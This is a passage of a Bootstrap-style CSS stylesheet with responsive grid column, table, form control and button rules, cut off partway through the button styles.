    .col-sm-1, .col-sm-2, .col-sm-3, .col-sm-4, .col-sm-5, .col-sm-6, .col-sm-7, .col-sm-8, .col-sm-9, .col-sm-10, .col-sm-11, .col-sm-12 {
      float: left;
    }
    .col-sm-12 {
      width: 100%;
    }
    .col-sm-11 {
      width: 91.66666667%;
    }
    .col-sm-10 {
      width: 83.33333333%;
    }
    .col-sm-9 {
      width: 75%;
    }
    .col-sm-8 {
      width: 66.66666667%;
    }
    .col-sm-7 {
      width: 58.33333333%;
    }
    .col-sm-6 {
      width: 50%;
    }
    .col-sm-5 {
      width: 41.66666667%;
    }
    .col-sm-4 {
      width: 33.33333333%;
    }
    .col-sm-3 {
      width: 25%;
    }
    .col-sm-2 {
      width: 16.66666667%;
    }
    .col-sm-1 {
      width: 8.33333333%;
    }
    .col-sm-pull-12 {
      right: 100%;
    }
    .col-sm-pull-11 {
      right: 91.66666667%;
    }
    .col-sm-pull-10 {
      right: 83.33333333%;
    }
    .col-sm-pull-9 {
      right: 75%;
    }
    .col-sm-pull-8 {
      right: 66.66666667%;
    }
    .col-sm-pull-7 {
      right: 58.33333333%;
    }
    .col-sm-pull-6 {
      right: 50%;
    }
    .col-sm-pull-5 {
      right: 41.66666667%;
    }
    .col-sm-pull-4 {
      right: 33.33333333%;
    }
    .col-sm-pull-3 {
      right: 25%;
    }
    .col-sm-pull-2 {
      right: 16.66666667%;
    }
    .col-sm-pull-1 {
      right: 8.33333333%;
    }
    .col-sm-pull-0 {
      right: auto;
    }
    .col-sm-push-12 {
      left: 100%;
    }
    .col-sm-push-11 {
      left: 91.66666667%;
    }
    .col-sm-push-10 {
      left: 83.33333333%;
    }
    .col-sm-push-9 {
      left: 75%;
    }
    .col-sm-push-8 {
      left: 66.66666667%;
    }
    .col-sm-push-7 {
      left: 58.33333333%;
    }
    .col-sm-push-6 {
      left: 50%;
    }
    .col-sm-push-5 {
      left: 41.66666667%;
    }
    .col-sm-push-4 {
      left: 33.33333333%;
    }
    .col-sm-push-3 {
      left: 25%;
    }
    .col-sm-push-2 {
      left: 16.66666667%;
    }
    .col-sm-push-1 {
      left: 8.33333333%;
    }
    .col-sm-push-0 {
      left: auto;
    }
    .col-sm-offset-12 {
      margin-left: 100%;
    }
    .col-sm-offset-11 {
      margin-left: 91.66666667%;
    }
    .col-sm-offset-10 {
      margin-left: 83.33333333%;
    }
    .col-sm-offset-9 {
      margin-left: 75%;
    }
    .col-sm-offset-8 {
      margin-left: 66.66666667%;
    }
    .col-sm-offset-7 {
      margin-left: 58.33333333%;
    }
    .col-sm-offset-6 {
      margin-left: 50%;
    }
    .col-sm-offset-5 {
      margin-left: 41.66666667%;
    }
    .col-sm-offset-4 {
      margin-left: 33.33333333%;
    }
    .col-sm-offset-3 {
      margin-left: 25%;
    }
    .col-sm-offset-2 {
      margin-left: 16.66666667%;
    }
    .col-sm-offset-1 {
      margin-left: 8.33333333%;
    }
    .col-sm-offset-0 {
      margin-left: 0;
    }
  }
  @media (min-width: 992px) {
    .col-md-1, .col-md-2, .col-md-3, .col-md-4, .col-md-5, .col-md-6, .col-md-7, .col-md-8, .col-md-9, .col-md-10, .col-md-11, .col-md-12 {
      float: left;
    }
    .col-md-12 {
      width: 100%;
    }
    .col-md-11 {
      width: 91.66666667%;
    }
    .col-md-10 {
      width: 83.33333333%;
    }
    .col-md-9 {
      width: 75%;
    }
    .col-md-8 {
      width: 66.66666667%;
    }
    .col-md-7 {
      width: 58.33333333%;
    }
    .col-md-6 {
      width: 50%;
    }
    .col-md-5 {
      width: 41.66666667%;
    }
    .col-md-4 {
      width: 33.33333333%;
    }
    .col-md-3 {
      width: 25%;
    }
    .col-md-2 {
      width: 16.66666667%;
    }
    .col-md-1 {
      width: 8.33333333%;
    }
    .col-md-pull-12 {
      right: 100%;
    }
    .col-md-pull-11 {
      right: 91.66666667%;
    }
    .col-md-pull-10 {
      right: 83.33333333%;
    }
    .col-md-pull-9 {
      right: 75%;
    }
    .col-md-pull-8 {
      right: 66.66666667%;
    }
    .col-md-pull-7 {
      right: 58.33333333%;
    }
    .col-md-pull-6 {
      right: 50%;
    }
    .col-md-pull-5 {
      right: 41.66666667%;
    }
    .col-md-pull-4 {
      right: 33.33333333%;
    }
    .col-md-pull-3 {
      right: 25%;
    }
    .col-md-pull-2 {
      right: 16.66666667%;
    }
    .col-md-pull-1 {
      right: 8.33333333%;
    }
    .col-md-pull-0 {
      right: auto;
    }
    .col-md-push-12 {
      left: 100%;
    }
    .col-md-push-11 {
      left: 91.66666667%;
    }
    .col-md-push-10 {
      left: 83.33333333%;
    }
    .col-md-push-9 {
      left: 75%;
    }
    .col-md-push-8 {
      left: 66.66666667%;
    }
    .col-md-push-7 {
      left: 58.33333333%;
    }
    .col-md-push-6 {
      left: 50%;
    }
    .col-md-push-5 {
      left: 41.66666667%;
    }
    .col-md-push-4 {
      left: 33.33333333%;
    }
    .col-md-push-3 {
      left: 25%;
    }
    .col-md-push-2 {
      left: 16.66666667%;
    }
    .col-md-push-1 {
      left: 8.33333333%;
    }
    .col-md-push-0 {
      left: auto;
    }
    .col-md-offset-12 {
      margin-left: 100%;
    }
    .col-md-offset-11 {
      margin-left: 91.66666667%;
    }
    .col-md-offset-10 {
      margin-left: 83.33333333%;
    }
    .col-md-offset-9 {
      margin-left: 75%;
    }
    .col-md-offset-8 {
      margin-left: 66.66666667%;
    }
    .col-md-offset-7 {
      margin-left: 58.33333333%;
    }
    .col-md-offset-6 {
      margin-left: 50%;
    }
    .col-md-offset-5 {
      margin-left: 41.66666667%;
    }
    .col-md-offset-4 {
      margin-left: 33.33333333%;
    }
    .col-md-offset-3 {
      margin-left: 25%;
    }
    .col-md-offset-2 {
      margin-left: 16.66666667%;
    }
    .col-md-offset-1 {
      margin-left: 8.33333333%;
    }
    .col-md-offset-0 {
      margin-left: 0;
    }
  }
  @media (min-width: 1200px) {
    .col-lg-1, .col-lg-2, .col-lg-3, .col-lg-4, .col-lg-5, .col-lg-6, .col-lg-7, .col-lg-8, .col-lg-9, .col-lg-10, .col-lg-11, .col-lg-12 {
      float: left;
    }
    .col-lg-12 {
      width: 100%;
    }
    .col-lg-11 {
      width: 91.66666667%;
    }
    .col-lg-10 {
      width: 83.33333333%;
    }
    .col-lg-9 {
      width: 75%;
    }
    .col-lg-8 {
      width: 66.66666667%;
    }
    .col-lg-7 {
      width: 58.33333333%;
    }
    .col-lg-6 {
      width: 50%;
    }
    .col-lg-5 {
      width: 41.66666667%;
    }
    .col-lg-4 {
      width: 33.33333333%;
    }
    .col-lg-3 {
      width: 25%;
    }
    .col-lg-2 {
      width: 16.66666667%;
    }
    .col-lg-1 {
      width: 8.33333333%;
    }
    .col-lg-pull-12 {
      right: 100%;
    }
    .col-lg-pull-11 {
      right: 91.66666667%;
    }
    .col-lg-pull-10 {
      right: 83.33333333%;
    }
    .col-lg-pull-9 {
      right: 75%;
    }
    .col-lg-pull-8 {
      right: 66.66666667%;
    }
    .col-lg-pull-7 {
      right: 58.33333333%;
    }
    .col-lg-pull-6 {
      right: 50%;
    }
    .col-lg-pull-5 {
      right: 41.66666667%;
    }
    .col-lg-pull-4 {
      right: 33.33333333%;
    }
    .col-lg-pull-3 {
      right: 25%;
    }
    .col-lg-pull-2 {
      right: 16.66666667%;
    }
    .col-lg-pull-1 {
      right: 8.33333333%;
    }
    .col-lg-pull-0 {
      right: auto;
    }
    .col-lg-push-12 {
      left: 100%;
    }
    .col-lg-push-11 {
      left: 91.66666667%;
    }
    .col-lg-push-10 {
      left: 83.33333333%;
    }
    .col-lg-push-9 {
      left: 75%;
    }
    .col-lg-push-8 {
      left: 66.66666667%;
    }
    .col-lg-push-7 {
      left: 58.33333333%;
    }
    .col-lg-push-6 {
      left: 50%;
    }
    .col-lg-push-5 {
      left: 41.66666667%;
    }
    .col-lg-push-4 {
      left: 33.33333333%;
    }
    .col-lg-push-3 {
      left: 25%;
    }
    .col-lg-push-2 {
      left: 16.66666667%;
    }
    .col-lg-push-1 {
      left: 8.33333333%;
    }
    .col-lg-push-0 {
      left: auto;
    }
    .col-lg-offset-12 {
      margin-left: 100%;
    }
    .col-lg-offset-11 {
      margin-left: 91.66666667%;
    }
    .col-lg-offset-10 {
      margin-left: 83.33333333%;
    }
    .col-lg-offset-9 {
      margin-left: 75%;
    }
    .col-lg-offset-8 {
      margin-left: 66.66666667%;
    }
    .col-lg-offset-7 {
      margin-left: 58.33333333%;
    }
    .col-lg-offset-6 {
      margin-left: 50%;
    }
    .col-lg-offset-5 {
      margin-left: 41.66666667%;
    }
    .col-lg-offset-4 {
      margin-left: 33.33333333%;
    }
    .col-lg-offset-3 {
      margin-left: 25%;
    }
    .col-lg-offset-2 {
      margin-left: 16.66666667%;
    }
    .col-lg-offset-1 {
      margin-left: 8.33333333%;
    }
    .col-lg-offset-0 {
      margin-left: 0;
    }
  }
  table {
    background-color: transparent;
  }
  th {
    text-align: left;
  }
  .table {
    width: 100%;
    max-width: 100%;
    margin-bottom: 20px;
  }
  .table > thead > tr > th,
  .table > tbody > tr > th,
  .table > tfoot > tr > th,
  .table > thead > tr > td,
  .table > tbody > tr > td,
  .table > tfoot > tr > td {
    padding: 2px;
    line-height: 1.42857143;
    vertical-align: top;
    border-top: 1px solid #ddd;
  }
  .table > thead > tr > th {
    vertical-align: bottom;
    border-bottom: 2px solid #ddd;
  }
  .table > caption + thead > tr:first-child > th,
  .table > colgroup + thead > tr:first-child > th,
  .table > thead:first-child > tr:first-child > th,
  .table > caption + thead > tr:first-child > td,
  .table > colgroup + thead > tr:first-child > td,
  .table > thead:first-child > tr:first-child > td {
    border-top: 0;
  }
  .table > tbody + tbody {
    border-top: 2px solid #ddd;
  }
  .table .table {
    background-color: #fff;
  }
  .table-condensed > thead > tr > th,
  .table-condensed > tbody > tr > th,
  .table-condensed > tfoot > tr > th,
  .table-condensed > thead > tr > td,
  .table-condensed > tbody > tr > td,
  .table-condensed > tfoot > tr > td {
    padding: 5px;
  }
  .table-bordered {
    border: 1px solid #ddd;
  }
  .table-bordered > thead > tr > th,
  .table-bordered > tbody > tr > th,
  .table-bordered > tfoot > tr > th,
  .table-bordered > thead > tr > td,
  .table-bordered > tbody > tr > td,
  .table-bordered > tfoot > tr > td {
    border: 1px solid #ddd;
  }
  .table-bordered > thead > tr > th,
  .table-bordered > thead > tr > td {
    border-bottom-width: 2px;
  }
  .table-striped > tbody > tr:nth-child(odd) > td,
  .table-striped > tbody > tr:nth-child(odd) > th {
    background-color: #f9f9f9;
  }
  .table-hover > tbody > tr:hover > td,
  .table-hover > tbody > tr:hover > th {
    background-color: #f5f5f5;
  }
  table col[class*="col-"] {
    position: static;
    display: table-column;
    float: none;
  }
  table td[class*="col-"],
  table th[class*="col-"] {
    position: static;
    display: table-cell;
    float: none;
  }
  .table > thead > tr > td.active,
  .table > tbody > tr > td.active,
  .table > tfoot > tr > td.active,
  .table > thead > tr > th.active,
  .table > tbody > tr > th.active,
  .table > tfoot > tr > th.active,
  .table > thead > tr.active > td,
  .table > tbody > tr.active > td,
  .table > tfoot > tr.active > td,
  .table > thead > tr.active > th,
  .table > tbody > tr.active > th,
  .table > tfoot > tr.active > th {
    background-color: #f5f5f5;
  }
  .table-hover > tbody > tr > td.active:hover,
  .table-hover > tbody > tr > th.active:hover,
  .table-hover > tbody > tr.active:hover > td,
  .table-hover > tbody > tr:hover > .active,
  .table-hover > tbody > tr.active:hover > th {
    background-color: #e8e8e8;
  }
  .table > thead > tr > td.success,
  .table > tbody > tr > td.success,
  .table > tfoot > tr > td.success,
  .table > thead > tr > th.success,
  .table > tbody > tr > th.success,
  .table > tfoot > tr > th.success,
  .table > thead > tr.success > td,
  .table > tbody > tr.success > td,
  .table > tfoot > tr.success > td,
  .table > thead > tr.success > th,
  .table > tbody > tr.success > th,
  .table > tfoot > tr.success > th {
    background-color: #dff0d8;
  }
  .table-hover > tbody > tr > td.success:hover,
  .table-hover > tbody > tr > th.success:hover,
  .table-hover > tbody > tr.success:hover > td,
  .table-hover > tbody > tr:hover > .success,
  .table-hover > tbody > tr.success:hover > th {
    background-color: #d0e9c6;
  }
  .table > thead > tr > td.info,
  .table > tbody > tr > td.info,
  .table > tfoot > tr > td.info,
  .table > thead > tr > th.info,
  .table > tbody > tr > th.info,
  .table > tfoot > tr > th.info,
  .table > thead > tr.info > td,
  .table > tbody > tr.info > td,
  .table > tfoot > tr.info > td,
  .table > thead > tr.info > th,
  .table > tbody > tr.info > th,
  .table > tfoot > tr.info > th {
    background-color: #d9edf7;
  }
  .table-hover > tbody > tr > td.info:hover,
  .table-hover > tbody > tr > th.info:hover,
  .table-hover > tbody > tr.info:hover > td,
  .table-hover > tbody > tr:hover > .info,
  .table-hover > tbody > tr.info:hover > th {
    background-color: #c4e3f3;
  }
  .table > thead > tr > td.warning,
  .table > tbody > tr > td.warning,
  .table > tfoot > tr > td.warning,
  .table > thead > tr > th.warning,
  .table > tbody > tr > th.warning,
  .table > tfoot > tr > th.warning,
  .table > thead > tr.warning > td,
  .table > tbody > tr.warning > td,
  .table > tfoot > tr.warning > td,
  .table > thead > tr.warning > th,
  .table > tbody > tr.warning > th,
  .table > tfoot > tr.warning > th {
    background-color: #fcf8e3;
  }
  .table-hover > tbody > tr > td.warning:hover,
  .table-hover > tbody > tr > th.warning:hover,
  .table-hover > tbody > tr.warning:hover > td,
  .table-hover > tbody > tr:hover > .warning,
  .table-hover > tbody > tr.warning:hover > th {
    background-color: #faf2cc;
  }
  .table > thead > tr > td.danger,
  .table > tbody > tr > td.danger,
  .table > tfoot > tr > td.danger,
  .table > thead > tr > th.danger,
  .table > tbody > tr > th.danger,
  .table > tfoot > tr > th.danger,
  .table > thead > tr.danger > td,
  .table > tbody > tr.danger > td,
  .table > tfoot > tr.danger > td,
  .table > thead > tr.danger > th,
  .table > tbody > tr.danger > th,
  .table > tfoot > tr.danger > th {
    background-color: #f2dede;
  }
  .table-hover > tbody > tr > td.danger:hover,
  .table-hover > tbody > tr > th.danger:hover,
  .table-hover > tbody > tr.danger:hover > td,
  .table-hover > tbody > tr:hover > .danger,
  .table-hover > tbody > tr.danger:hover > th {
    background-color: #ebcccc;
  }
  @media screen and (max-width: 767px) {
    .table-responsive {
      width: 100%;
      margin-bottom: 15px;
      overflow-x: auto;
      overflow-y: hidden;
      -webkit-overflow-scrolling: touch;
      -ms-overflow-style: -ms-autohiding-scrollbar;
      border: 1px solid #ddd;
    }
    .table-responsive > .table {
      margin-bottom: 0;
    }
    .table-responsive > .table > thead > tr > th,
    .table-responsive > .table > tbody > tr > th,
    .table-responsive > .table > tfoot > tr > th,
    .table-responsive > .table > thead > tr > td,
    .table-responsive > .table > tbody > tr > td,
    .table-responsive > .table > tfoot > tr > td {
      white-space: nowrap;
    }
    .table-responsive > .table-bordered {
      border: 0;
    }
    .table-responsive > .table-bordered > thead > tr > th:first-child,
    .table-responsive > .table-bordered > tbody > tr > th:first-child,
    .table-responsive > .table-bordered > tfoot > tr > th:first-child,
    .table-responsive > .table-bordered > thead > tr > td:first-child,
    .table-responsive > .table-bordered > tbody > tr > td:first-child,
    .table-responsive > .table-bordered > tfoot > tr > td:first-child {
      border-left: 0;
    }
    .table-responsive > .table-bordered > thead > tr > th:last-child,
    .table-responsive > .table-bordered > tbody > tr > th:last-child,
    .table-responsive > .table-bordered > tfoot > tr > th:last-child,
    .table-responsive > .table-bordered > thead > tr > td:last-child,
    .table-responsive > .table-bordered > tbody > tr > td:last-child,
    .table-responsive > .table-bordered > tfoot > tr > td:last-child {
      border-right: 0;
    }
    .table-responsive > .table-bordered > tbody > tr:last-child > th,
    .table-responsive > .table-bordered > tfoot > tr:last-child > th,
    .table-responsive > .table-bordered > tbody > tr:last-child > td,
    .table-responsive > .table-bordered > tfoot > tr:last-child > td {
      border-bottom: 0;
    }
  }
  fieldset {
    min-width: 0;
    padding: 0;
    margin: 0;
    border: 0;
  }
  legend {
    display: block;
    width: 100%;
    padding: 0;
    margin-bottom: 20px;
    font-size: 21px;
    line-height: inherit;
    color: #333;
    border: 0;
    border-bottom: 1px solid #e5e5e5;
  }
  label {
    display: inline-block;
    max-width: 100%;
    margin-bottom: 5px;
    font-weight: bold;
  }
  input[type="search"] {
    -webkit-box-sizing: border-box;
       -moz-box-sizing: border-box;
            box-sizing: border-box;
  }
  input[type="radio"],
  input[type="checkbox"] {
    margin: 4px 0 0;
    margin-top: 1px \9;
    line-height: normal;
  }
  input[type="file"] {
    display: block;
  }
  input[type="range"] {
    display: block;
    width: 100%;
  }
  select[multiple],
  select[size] {
    height: auto;
  }
  input[type="file"]:focus,
  input[type="radio"]:focus,
  input[type="checkbox"]:focus {
    outline: thin dotted;
    outline: 5px auto -webkit-focus-ring-color;
    outline-offset: -2px;
  }
  output {
    display: block;
    padding-top: 7px;
    font-size: 14px;
    line-height: 1.42857143;
    color: #555;
  }
  .form-control {
    display: block;
    width: 100%;
    height: 34px;
    padding: 6px 12px;
    font-size: 14px;
    line-height: 1.42857143;
    color: #555;
    background-color: #fff;
    background-image: none;
    border: 1px solid #ccc;
    border-radius: 4px;
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
    -webkit-transition: border-color ease-in-out .15s, -webkit-box-shadow ease-in-out .15s;
         -o-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
            transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
  }
  .form-control:focus {
    border-color: #66afe9;
    outline: 0;
    -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102, 175, 233, .6);
            box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102, 175, 233, .6);
  }
  .form-control::-moz-placeholder {
    color: #777;
    opacity: 1;
  }
  .form-control:-ms-input-placeholder {
    color: #777;
  }
  .form-control::-webkit-input-placeholder {
    color: #777;
  }
  .form-control[disabled],
  .form-control[readonly],
  fieldset[disabled] .form-control {
    cursor: not-allowed;
    background-color: #eee;
    opacity: 1;
  }
  textarea.form-control {
    height: auto;
  }
  input[type="search"] {
    -webkit-appearance: none;
  }
  input[type="date"],
  input[type="time"],
  input[type="datetime-local"],
  input[type="month"] {
    line-height: 34px;
    line-height: 1.42857143 \0;
  }
  input[type="date"].input-sm,
  input[type="time"].input-sm,
  input[type="datetime-local"].input-sm,
  input[type="month"].input-sm {
    line-height: 30px;
  }
  input[type="date"].input-lg,
  input[type="time"].input-lg,
  input[type="datetime-local"].input-lg,
  input[type="month"].input-lg {
    line-height: 46px;
  }
  .form-group {
    margin-bottom: 15px;
  }
  .radio,
  .checkbox {
    position: relative;
    display: block;
    min-height: 20px;
    margin-top: 10px;
    margin-bottom: 10px;
  }
  .radio label,
  .checkbox label {
    padding-left: 20px;
    margin-bottom: 0;
    font-weight: normal;
    cursor: pointer;
  }
  .radio input[type="radio"],
  .radio-inline input[type="radio"],
  .checkbox input[type="checkbox"],
  .checkbox-inline input[type="checkbox"] {
    position: absolute;
    margin-top: 4px \9;
    margin-left: -20px;
  }
  .radio + .radio,
  .checkbox + .checkbox {
    margin-top: -5px;
  }
  .radio-inline,
  .checkbox-inline {
    display: inline-block;
    padding-left: 20px;
    margin-bottom: 0;
    font-weight: normal;
    vertical-align: middle;
    cursor: pointer;
  }
  .radio-inline + .radio-inline,
  .checkbox-inline + .checkbox-inline {
    margin-top: 0;
    margin-left: 10px;
  }
  input[type="radio"][disabled],
  input[type="checkbox"][disabled],
  input[type="radio"].disabled,
  input[type="checkbox"].disabled,
  fieldset[disabled] input[type="radio"],
  fieldset[disabled] input[type="checkbox"] {
    cursor: not-allowed;
  }
  .radio-inline.disabled,
  .checkbox-inline.disabled,
  fieldset[disabled] .radio-inline,
  fieldset[disabled] .checkbox-inline {
    cursor: not-allowed;
  }
  .radio.disabled label,
  .checkbox.disabled label,
  fieldset[disabled] .radio label,
  fieldset[disabled] .checkbox label {
    cursor: not-allowed;
  }
  .form-control-static {
    padding-top: 7px;
    padding-bottom: 7px;
    margin-bottom: 0;
  }
  .form-control-static.input-lg,
  .form-control-static.input-sm {
    padding-right: 0;
    padding-left: 0;
  }
  .input-sm,
  .form-horizontal .form-group-sm .form-control {
    height: 30px;
    padding: 5px 10px;
    font-size: 12px;
    line-height: 1.5;
    border-radius: 3px;
  }
  select.input-sm {
    height: 30px;
    line-height: 30px;
  }
  textarea.input-sm,
  select[multiple].input-sm {
    height: auto;
  }
  .input-lg,
  .form-horizontal .form-group-lg .form-control {
    height: 46px;
    padding: 10px 16px;
    font-size: 18px;
    line-height: 1.33;
    border-radius: 6px;
  }
  select.input-lg {
    height: 46px;
    line-height: 46px;
  }
  textarea.input-lg,
  select[multiple].input-lg {
    height: auto;
  }
  .has-feedback {
    position: relative;
  }
  .has-feedback .form-control {
    padding-right: 42.5px;
  }
  .form-control-feedback {
    position: absolute;
    top: 25px;
    right: 0;
    z-index: 2;
    display: block;
    width: 34px;
    height: 34px;
    line-height: 34px;
    text-align: center;
  }
  .input-lg + .form-control-feedback {
    width: 46px;
    height: 46px;
    line-height: 46px;
  }
  .input-sm + .form-control-feedback {
    width: 30px;
    height: 30px;
    line-height: 30px;
  }
  .has-success .help-block,
  .has-success .control-label,
  .has-success .radio,
  .has-success .checkbox,
  .has-success .radio-inline,
  .has-success .checkbox-inline {
    color: #3c763d;
  }
  .has-success .form-control {
    border-color: #3c763d;
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
  }
  .has-success .form-control:focus {
    border-color: #2b542c;
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #67b168;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #67b168;
  }
  .has-success .input-group-addon {
    color: #3c763d;
    background-color: #dff0d8;
    border-color: #3c763d;
  }
  .has-success .form-control-feedback {
    color: #3c763d;
  }
  .has-warning .help-block,
  .has-warning .control-label,
  .has-warning .radio,
  .has-warning .checkbox,
  .has-warning .radio-inline,
  .has-warning .checkbox-inline {
    color: #8a6d3b;
  }
  .has-warning .form-control {
    border-color: #8a6d3b;
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
  }
  .has-warning .form-control:focus {
    border-color: #66512c;
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #c0a16b;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #c0a16b;
  }
  .has-warning .input-group-addon {
    color: #8a6d3b;
    background-color: #fcf8e3;
    border-color: #8a6d3b;
  }
  .has-warning .form-control-feedback {
    color: #8a6d3b;
  }
  .has-error .help-block,
  .has-error .control-label,
  .has-error .radio,
  .has-error .checkbox,
  .has-error .radio-inline,
  .has-error .checkbox-inline {
    color: #a94442;
  }
  .has-error .form-control {
    border-color: #a94442;
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
  }
  .has-error .form-control:focus {
    border-color: #843534;
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #ce8483;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #ce8483;
  }
  .has-error .input-group-addon {
    color: #a94442;
    background-color: #f2dede;
    border-color: #a94442;
  }
  .has-error .form-control-feedback {
    color: #a94442;
  }
  .has-feedback label.sr-only ~ .form-control-feedback {
    top: 0;
  }
  .help-block {
    display: block;
    margin-top: 5px;
    margin-bottom: 10px;
    color: #737373;
  }
  @media (min-width: 768px) {
    .form-inline .form-group {
      display: inline-block;
      margin-bottom: 0;
      vertical-align: middle;
    }
    .form-inline .form-control {
      display: inline-block;
      width: auto;
      vertical-align: middle;
    }
    .form-inline .input-group {
      display: inline-table;
      vertical-align: middle;
    }
    .form-inline .input-group .input-group-addon,
    .form-inline .input-group .input-group-btn,
    .form-inline .input-group .form-control {
      width: auto;
    }
    .form-inline .input-group > .form-control {
      width: 100%;
    }
    .form-inline .control-label {
      margin-bottom: 0;
      vertical-align: middle;
    }
    .form-inline .radio,
    .form-inline .checkbox {
      display: inline-block;
      margin-top: 0;
      margin-bottom: 0;
      vertical-align: middle;
    }
    .form-inline .radio label,
    .form-inline .checkbox label {
      padding-left: 0;
    }
    .form-inline .radio input[type="radio"],
    .form-inline .checkbox input[type="checkbox"] {
      position: relative;
      margin-left: 0;
    }
    .form-inline .has-feedback .form-control-feedback {
      top: 0;
    }
  }
  .form-horizontal .radio,
  .form-horizontal .checkbox,
  .form-horizontal .radio-inline,
  .form-horizontal .checkbox-inline {
    padding-top: 7px;
    margin-top: 0;
    margin-bottom: 0;
  }
  .form-horizontal .radio,
  .form-horizontal .checkbox {
    min-height: 27px;
  }
  .form-horizontal .form-group {
    margin-right: -15px;
    margin-left: -15px;
  }
  @media (min-width: 768px) {
    .form-horizontal .control-label {
      padding-top: 7px;
      margin-bottom: 0;
      text-align: right;
    }
  }
  .form-horizontal .has-feedback .form-control-feedback {
    top: 0;
    right: 15px;
  }
  @media (min-width: 768px) {
    .form-horizontal .form-group-lg .control-label {
      padding-top: 14.3px;
    }
  }
  @media (min-width: 768px) {
    .form-horizontal .form-group-sm .control-label {
      padding-top: 6px;
    }
  }
  .btn {
    display: inline-block;
    padding: 6px 12px;
    margin-bottom: 0;
    font-size: 14px;
    font-weight: normal;
    line-height: 1.42857143;
    text-align: center;
    white-space: nowrap;
    vertical-align: middle;
    cursor: pointer;
    -webkit-user-select: none;
       -moz-user-select: none;
        -ms-user-select: none;
            user-select: none;
    background-image: none;
    border: 1px solid transparent;
    border-radius: 4px;
  }
  .btn:focus,
  .btn:active:focus,
  .btn.active:focus {
    outline: thin dotted;
    outline: 5px auto -webkit-focus-ring-color;
    outline-offset: -2px;
  }
  .btn:hover,
  .btn:focus {
    color: #333;
    text-decoration: none;
  }
  .btn:active,
  .btn.active {
    background-image: none;
    outline: 0;
    -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, .125);
            box-shadow: inset 0 3px 5px rgba(0, 0, 0, .125);
  }
  .btn.disabled,
  .btn[disabled],
  fieldset[disabled] .btn {
    pointer-events: none;
    cursor: not-allowed;
    filter: alpha(opacity=65);
    -webkit-box-shadow: none;
            box-shadow: none;
    opacity: .65;
  }
  .btn-default {
    color: #333;
    background-color: #fff;
    border-color: #ccc;
  }
  .btn-default:hover,
  .btn-default:focus,
  .btn-default:active,
  .btn-default.active,
  .open > .dropdown-toggle.btn-default {
    color: #333;
    background-color: #e6e6e6;
    border-color: #adadad;
  }
  .btn-default:active,
  .btn-default.active,
  .open > .dropdown-toggle.btn-default {
    background-image: none;
  }
  .btn-default.disabled,
  .btn-default[disabled],
  fieldset[disabled] .btn-default,
  .btn-default.disabled:hover,
  .btn-default[disabled]:hover,
  fieldset[disabled] .btn-default:hover,
  .btn-default.disabled:focus,
  .btn-default[disabled]:focus,
  fieldset[disabled] .btn-default:focus,
  .btn-default.disabled:active,
  .btn-default[disabled]:active,
  fieldset[disabled] .btn-default:active,
  .btn-default.disabled.active,
  .btn-default[disabled].active,
  fieldset[disabled] .btn-default.active {
    background-color: #fff;
    border-color: #ccc;
  }
  .btn-default .badge {
    color: #fff;
    background-color: #333;
  }
  .btn-primary {
    color: #fff;
    background-color: #428bca;
    border-color: #357ebd;
  }
  .btn-primary:hover,
  .btn-primary:focus,
  .btn-primary:active,
  .btn-primary.active,
  .open > .dropdown-toggle.btn-primary {
    color: #fff;
    background-color: #3071a9;
    border-color: #285e8e;
  }
  .btn-primary:active,
  .btn-primary.active,
  .open > .dropdown-toggle.btn-primary {
    background-image: none;
  }
  .btn-primary.disabled,
  .btn-primary[disabled],
  fieldset[disabled] .btn-primary,
  .btn-primary.disabled:hover,
  .btn-primary[disabled]:hover,
  fieldset[disabled] .btn-primary:hover,
  .btn-primary.disabled:focus,
  .btn-primary[disabled]:focus,
  fieldset[disabled] .btn-primary:focus,
  .btn-primary.disabled:active,
  .btn-primary[disabled]:active,
  fieldset[disabled] .btn-primary:active,
  .btn-primary.disabled.active,
  .btn-primary[disabled].active,
  fieldset[disabled] .btn-primary.active {
    background-color: #428bca;
    border-color: #357ebd;
  }
  .btn-primary .badge {
    color: #428bca;
    background-color: #fff;
  }
  .btn-success {
    color: #fff;
    background-color: #5cb85c;
    border-color: #4cae4c;
  }
  .btn-success:hover,
  .btn-success:focus,
  .btn-success:active,
  .btn-success.active,
  .open > .dropdown-toggle.btn-success {
    color: #fff;
    background-color: #449d44;
    border-color: #398439;
  }
  .btn-success:active,
  .btn-success.active,
  .open > .dropdown-toggle.btn-success {
    background-image: none;
  }
  .btn-success.disabled,
  .btn-success[disabled],
  fieldset[disabled] .btn-success,
  .btn-success.disabled:hover,
  .btn-success[disabled]:hover,
  fieldset[disabled] .btn-success:hover,
  .btn-success.disabled:focus,
  .btn-success[disabled]:focus,
  fieldset[disabled] .btn-success:focus,
  .btn-success.disabled:active,
  .btn-success[disabled]:active,
  fieldset[disabled] .btn-success:active,
  .btn-success.disabled.active,
  .btn-success[disabled].active,
  fieldset[disabled] .btn-success.active {
    background-color: #5cb85c;
    border-color: #4cae4c;
  }
  .btn-success .badge {
    color: #5cb85c;
    background-color: #fff;
  }
  .btn-info {
    color: #fff;
    background-color: #5bc0de;
    border-color: #46b8da;
  }
  .btn-info:hover,
  .btn-info:focus,
  .btn-info:active,
  .btn-info.active,
  .open > .dropdown-toggle.btn-info {
    color: #fff;
    background-color: #31b0d5;
    border-color: #269abc;
  }
  .btn-info:active,
  .btn-info.active,
